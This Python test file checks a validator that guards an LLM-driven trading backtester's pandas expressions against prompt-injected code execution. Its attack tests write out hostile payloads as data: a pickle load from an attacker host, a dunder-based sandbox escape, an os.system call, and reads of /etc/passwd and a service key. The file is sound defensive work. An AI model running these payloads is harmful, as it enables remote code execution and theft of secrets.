import unittest

from app.strategies.expression_guard import ExpressionValidationError, validate_expression


class ExpressionGuardAcceptsRealStrategiesTests(unittest.TestCase):
    """Every expression the LLM prompt and rule-engine fallback can emit must still run."""

    VALID = [
        # straight from nlp_backtester.SYSTEM_PROMPT's documented patterns
        "(df['day_return'].shift(1) >= 1.0) & (df['day_return'].shift(2) >= 1.0)",
        "(df['RSI_14'] > 30) & (df['RSI_14'].shift(1) <= 30)",
        "df['week_return'] < -5.0",
        "(df['close'] > df['SMA_50']) & (df['close'] > df['SMA_200']) & (df['close'] > df['EMA_20'])",
        "(df['MACD'] > df['MACD_signal']) & (df['MACD'].shift(1) <= df['MACD_signal'].shift(1))",
        "(df['SMA_50'] > df['SMA_200']) & (df['SMA_50'].shift(1) <= df['SMA_200'].shift(1))",
        "df['vol_ratio'] > 2.0",
        "df['close'] > df['BBU']",
        "(df['is_green'] == 1) & (df['is_green'].shift(1) == 1) & (df['is_green'].shift(2) == 1)",
        "df['gap_up'] == True",
        "(df['date'].dt.weekday == 4)",
        "df['close'] > df['close'].rolling(20).mean()",
        "~(df['close'] < df['EMA_20'])",
        "(df['close'] < df['EMA_20']) | (df['RSI_14'] > 70)",
        # the ask_ai_service recovery-idea default
        "(df['week_return'].shift(1) < -5.0) & (df['day_return'] > 5.0) & (df['RSI_14'] > 30)",
    ]

    def test_documented_strategies_all_validate(self):
        for expr in self.VALID:
            with self.subTest(expr=expr):
                validate_expression(expr)


class ExpressionGuardBlocksAttacksTests(unittest.TestCase):
    """The guard exists to stop prompt-injected code execution."""

    def test_blocks_read_pickle_rce(self):
        # pandas deserialises pickles by executing them: a full RCE primitive.
        with self.assertRaises(ExpressionValidationError):
            validate_expression("pd.read_pickle('https://attacker.example/payload.pkl')")

    def test_blocks_numpy_load_rce(self):
        with self.assertRaises(ExpressionValidationError):
            validate_expression("np.load('/tmp/x.npy', allow_pickle=True)")

    def test_blocks_class_traversal_sandbox_escape(self):
        # The classic escape route out of an eval with empty __builtins__.
        with self.assertRaises(ExpressionValidationError):
            validate_expression("df.__class__.__mro__[1].__subclasses__()")

    def test_blocks_dunder_attribute_access(self):
        with self.assertRaises(ExpressionValidationError):
            validate_expression("df['close'].__reduce__()")

    def test_blocks_import(self):
        with self.assertRaises(ExpressionValidationError):
            validate_expression("__import__('os').system('id')")

    def test_blocks_arbitrary_names(self):
        for expr in ["os.getenv('SUPABASE_SERVICE_ROLE_KEY')", "open('/etc/passwd').read()", "eval('1+1')"]:
            with self.subTest(expr=expr):
                with self.assertRaises(ExpressionValidationError):
                    validate_expression(expr)

    def test_blocks_lambda_and_comprehension(self):
        with self.assertRaises(ExpressionValidationError):
            validate_expression("(lambda: 1)()")
        with self.assertRaises(ExpressionValidationError):
            validate_expression("[x for x in df['close']]")

    def test_blocks_dataframe_methods_that_execute_or_write(self):
        for expr in [
            "df.eval('close > 1')",
            "df.query('close > 1')",
            "df['close'].apply(print)",
            "df.to_csv('/tmp/leak.csv')",
        ]:
            with self.subTest(expr=expr):
                with self.assertRaises(ExpressionValidationError):
                    validate_expression(expr)

    def test_blocks_unknown_column(self):
        with self.assertRaises(ExpressionValidationError):
            validate_expression("df['not_a_real_column'] > 1")

    def test_blocks_oversized_and_empty(self):
        with self.assertRaises(ExpressionValidationError):
            validate_expression("")
        with self.assertRaises(ExpressionValidationError):
            validate_expression("df['close'] > " + "9" * 3000)
        with self.assertRaises(ExpressionValidationError):
            validate_expression("df['close'].rolling(99999999).mean() > 1")


class ExpressionGuardRuntimeTests(unittest.TestCase):
    """_eval_safe must reject a hostile expression before evaluating it."""

    def _frame(self):
        import pandas as pd

        return pd.DataFrame({
            "date": pd.date_range("2026-01-01", periods=60, freq="D"),
            "open": [100.0] * 60,
            "high": [101.0] * 60,
            "low": [99.0] * 60,
            "close": [100.0 + i for i in range(60)],
            "volume": [1_000_000] * 60,
        })

    def test_eval_safe_runs_a_valid_expression(self):
        from app.strategies.nlp_backtester import _eval_safe, _prepare_df

        frame = _prepare_df(self._frame())
        result = _eval_safe("df['close'] > df['SMA_20']", frame)
        self.assertEqual(result.dtype, bool)
        self.assertTrue(result.any())

    def test_eval_safe_refuses_rce_payload(self):
        from app.strategies.nlp_backtester import _eval_safe, _prepare_df

        frame = _prepare_df(self._frame())
        with self.assertRaises(ExpressionValidationError):
            _eval_safe("pd.read_pickle('https://attacker.example/x.pkl')", frame)


if __name__ == "__main__":
    unittest.main()
